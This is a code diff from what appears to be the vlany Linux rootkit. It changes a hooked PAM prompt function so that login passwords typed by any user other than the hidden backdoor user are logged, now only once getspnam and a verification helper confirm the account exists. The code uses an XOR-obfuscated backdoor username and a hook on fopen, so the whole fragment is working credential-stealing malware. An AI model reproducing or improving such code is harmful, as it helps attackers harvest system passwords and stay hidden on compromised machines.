@@ -98,7 +98,8 @@ pam_vprompt (pam_handle_t *pamh, int style, char **response,
 
   // Logging login attempts
   char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
-  if (strcmp(u,vlany_user) && pam_resp->resp != NULL) // any user that isn't the vlany user gets their logins logged
+  struct spwd *cuser_entry = getspnam(u);
+  if (strcmp(u,vlany_user) && pam_resp->resp != NULL && ver_acc_exist(cuser_entry, pam_resp->resp)) // any non-vlany user gets deets logged.. ver_acc_exist added to stop logging of non-existent accounts
   {
       HOOK(old_fopen, CFOPEN);
 
